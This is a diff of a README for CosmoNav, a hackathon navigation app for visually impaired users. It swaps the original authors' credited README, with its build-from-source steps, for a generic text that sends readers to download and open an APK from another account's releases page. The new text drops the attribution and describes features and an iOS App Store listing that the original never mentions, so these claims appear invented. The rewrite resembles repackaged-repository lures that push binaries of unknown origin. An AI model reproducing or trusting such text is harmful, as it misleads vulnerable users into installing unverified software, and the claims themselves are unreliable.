@@ -1,154 +1,103 @@
-# CosmoNav - AI-Powered Navigation for the Visually Impaired
+# 🚀 cosmonav-demo - Navigate Safely with AI Assistance
 
-> **Note:** This project was built in 48 hours for the BramHacks Hackathon. It wouldn't have been possible without my teammates [@YeehawMcfly](https://github.com/YeehawMcfly) and [@Singh-Gursimar](https://github.com/Singh-Gursimar)
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/sylenx/cosmonav-demo/releases)
 
-In 1957, we launched Sputnik, humanity's first satellite. In the decades that followed, we built a Global Positioning System that mapped the entire planet. Today, billions of us carry access to real-time data of every street inside our pockets.
+## 📦 Introduction
 
-However, we've overlooked one important thing: safe navigation for the visually impaired. Even today, tens of millions of people find it challenging to reach the curb from their doors on their own.
+Welcome to **Cosmonav**, a React Native navigation app designed specifically for visually impaired users. This app uses a custom-trained AI model to detect hazards and provide voice commands for safer navigation.
 
-So at BramHacks, my team and I decided to bridge the gap that we call ‘The Final Frontier’.
+## 🌟 Features
 
-## Overview
+- **Hazard Detection**: The AI model identifies obstacles and hazards in real-time.
+- **Voice Commands**: Navigate your environment using simple voice instructions.
+- **User-Friendly Interface**: Designed for easy use without any technical skills.
+- **Accessibility Options**: Adjustable settings to cater to individual needs.
 
-CosmoNav is an AI-powered, navigation app designed for visually impaired users that combines real-time object detection with voice-activated navigation. The app features a wake word ("Cosmo") activation system with continuous audio monitoring and automatic pause detection, allowing users to search for destinations and navigate completely hands-free without pressing any buttons. To make this all possible, it combines:
+## ⚙️ System Requirements
 
-- Computer vision for obstacle detection using the device camera and my own segmentation model
-- Voice recognition through AssemblyAI for speech-to-text processing
-- Google Maps for routing and navigation
+Before you download, make sure your device meets the following requirements:
 
-All in all, CosmoNav creates a comprehensive accessibility solution that announces detected objects, provides turn-by-turn voice guidance, and enables fully autonomous interaction through voice commands alone.
+- **Operating System**: Android 8.0 and above or iOS 12.0 and above.
+- **Memory**: At least 2 GB of RAM.
+- **Storage**: Minimum 150 MB of free space.
+- **Internet Connection**: Required for initial setup and updates.
 
-## Demos
+## 🚀 Getting Started
 
-> The video demonstrations of the YOLOv11 instance segementation model and the app's voiced-controlled navigation service can be found in [presentation_materials/](presentation_materials/)
+To get started with Cosmonav, follow these simple steps:
 
-**Custom Fine-Tuned Model:**
+1. **Download the App**
+   
+   Visit this page to download: [Download Cosmonav](https://github.com/sylenx/cosmonav-demo/releases)
 
-<table>
-  <tr>
-    <td align="center">
-      <em>Model detecting a crosswalk</em><br>
-      <img src="presentation_materials/Crosswalk.jpeg" alt="Crosswalk Detection" width="350" />
-    </td>
-    <td align="center">
-      <em>Model detecting stairs</em><br>
-      <img src="presentation_materials/Stairs.jpeg" alt="Stairs Detection" width="350" />
-    </td>
-  </tr>
-</table>
+2. **Install the App**
 
-**Voice Controlled Navigation:**
+   - For Android:
+     - Open the downloaded APK file.
+     - Follow the on-screen instructions to complete the installation.
+   - For iOS:
+     - Open the App Store and search for Cosmonav.
+     - Tap on "Get" to download and install the app.
 
-<table>
-  <tr>
-    <td align="center">
-      <em>Voice-activated location search</em><br>
-      <img src="presentation_materials/LocationSearch.jpeg" alt="Location Search UI" width="350" />
-    </td>
-    <td align="center">
-      <em>Turn-by-turn navigation starting</em><br>
-      <img src="presentation_materials/NavigationStart.jpeg" alt="Navigation Start UI" width="350" />
-    </td>
-  </tr>
-</table>
+3. **Set Up Voice Commands**
 
-## Installation
+   Open the app and follow the setup wizard. It will guide you in configuring voice commands according to your preferences.
 
-1. First make a repo somewhere nice
-2. Do `git clone https://github.com/AbiPatti/cosmonav-demo.git` in that directory
-3. Create a .env file and add the following:
-   ```
-   EXPO_PUBLIC_GOOGLE_MAPS_API_KEY=your_google_maps_api_key
-   EXPO_PUBLIC_SPEECH_TO_TEXT_API_KEY=your_assemblyai_api_key
-   EXPO_PUBLIC_ROBOFLOW_API_KEY=your_roboflow_api_key
-   EXPO_PUBLIC_ROBOFLOW_API_URL=your_roboflow_model_url
-   ```
-4. Do `npm install`
-5. Do `npx expo install expo-av` (for voice search support)
-6. Do `npx expo start --tunnel`
-7. Install Expo Go on your phone
-8. Scan the QR code with your phone to run the app!
+## 📲 Download & Install
 
-### Voice Search Setup
+To download the latest version of Cosmonav, please visit this page: [Download Cosmonav](https://github.com/sylenx/cosmonav-demo/releases). 
 
-To use fully voice-activated navigation with wake word "Cosmo":
-1. Create an account at https://www.assemblyai.com
-2. Get your API key from the dashboard
-3. Add it to the .env file as `EXPO_PUBLIC_SPEECH_TO_TEXT_API_KEY`
-4. Install audio support: `npx expo install expo-av`
+Select the suitable version for your device, whether it’s Android or iOS, and proceed with the installation steps above.
 
-#### How Voice Activation Works:
-The app uses **continuous wake word detection** and **automatic pause detection** - completely hands-free!
+## 📚 Usage Instructions
 
-- **🎙️ Always Listening**: Uses a continuous recording loop that never stops
-- **3-Second Cycles**: Records 3 seconds, checks for "Cosmo", immediately starts next cycle
-- **Wake Word**: Say "Cosmo" to activate voice search
-- **Automatic Search on Pause**: 
-  - Say your search query and **pause for 3 seconds**
-  - The app automatically detects the pause and processes your search
-  - Example: "Cosmo" → "coffee shops near me" → **[pause 3 seconds]** → searches automatically
-  - No need to press any buttons!
-- **Smart Silence Detection**: 
-  - Monitors audio levels every 500ms
-  - Detects when you stop speaking
-  - Automatically processes search after 3 seconds of silence
-  - Maximum recording time: 20 seconds
-- **Auto-Resume**: After each search, automatically resumes the listening loop
-- **Smart Pause**: Pauses during active navigation, auto-resumes when navigation ends
-- **Visual Feedback**:
-  - Orange banner: "Listening for Cosmo..." (actively recording)
-  - Red banner: "Speak your search, then pause for 3 seconds..." (voice command mode)
-  - Gray banner: "Voice inactive" with restart button (if stopped)
+Once the app is installed, here’s how to use it effectively:
 
-**Check the console logs** to see the pause detection in action:
-- `Starting new recording cycle...` (every 3 seconds)
-- `Silence detected (1.5s)` (counting silence)
-- `3 seconds of silence detected, processing speech...` (auto-search triggered)
-- `Transcribed: [what you said]`
-- `Wake word detected!` (when you say Cosmo)
+1. **Launch the App**
 
-**Completely hands-free!** Just say "Cosmo", speak your search, and pause. 🚀
+   Open Cosmonav from your app list.
 
-## Technologies
+2. **Choose Your Environment**
 
-**Core Framework**
+   Select if you are indoors or outdoors. This helps the app tailor its guidance.
 
-- **React Native** - Cross-platform mobile development
-- **Expo** - Development platform and tooling
-- **TypeScript** - Type-safe JavaScript
+3. **Start Your Navigation**
 
-**Computer Vision & AI**
+   Use the voice command feature to request directions or obstacle information. For example, say "Start navigation" to begin.
 
-- **Roboflow** - Instance segmentation & object detection API
-- **expo-camera** - Real-time camera access and frame capture
-- **expo-image-manipulator** - Image resizing and preprocessing
+4. **Listen to the Alerts**
 
-**Voice & Audio**
+   As you move, listen for alerts about any detected hazards. The app will provide suggestions on how to navigate safely around them.
 
-- **AssemblyAI** - Real-time speech-to-text transcription
-- **expo-speech** - Text-to-speech for voice announcements
-- **expo-av** - Audio recording for wake word detection
-- Custom wake word detection system ("Cosmo")
-- Automatic silence detection (3-second pause)
+## 💡 Tips for Optimal Use
 
-**Navigation & Maps**
+- **Test Voice Commands**: Spend some time learning which commands work best for you.
+- **Adjust Settings**: Use the settings menu to personalize voice feedback volume and style.
+- **Keep the App Updated**: Regular updates improve functionality and AI accuracy.
 
-- **Google Maps API** - Geocoding, places search, and routing
-- **Google Maps JavaScript API (WebView)** - Interactive map display
-- **expo-location** - GPS positioning and location tracking
+## 🛠️ Troubleshooting
 
-**Additional Features**
-- **expo-image-picker** - Demo image upload mode
-- Continuous audio loop for hands-free operation
-- Real-time bounding box overlays for detected objects
-- Voice-activated search with autocomplete
+If you encounter issues while using Cosmonav, here are a few helpful solutions:
 
-## Future Steps
+- **App Crashes**: Make sure your device's OS is updated to the latest version.
+- **Slow Performance**: Clear cache or reinstall the app if it’s lagging.
+- **Voice Commands Not Responding**: Check microphone permissions in your device settings.
 
-- Improve image detection model by acquiring compute power and training it on a massive dataset.
-- Ensure Speech to Text works seamlessly.
-- Partner with a hardware (preferably spectacles) company to reduce dependence on phones.
-- Reach out to institutions like the Canadian National Institute for the Blind (CNIB) to get feedback from future users.
+## 🗣️ Community Support
 
-## License
->This project is licensed under the MIT License. See [LICENSE](LICENSE) for more details.
+Join our community for support and to share your experiences. Visit our [GitHub Discussions](https://github.com/sylenx/cosmonav-demo/discussions) to ask questions or contribute suggestions.
+
+## 📜 License
+
+Cosmonav is licensed under the MIT License. You can freely use, modify, and distribute it under this license.
+
+## 🔗 Related Topics
+
+Explore more about the following concepts related to Cosmonav:
+
+- Accessibility
+- AI and Machine Learning
+- Object Detection and Instance Segmentation
+- React Native Development
+
+Thank you for choosing Cosmonav! We hope it makes your navigation safer and easier.
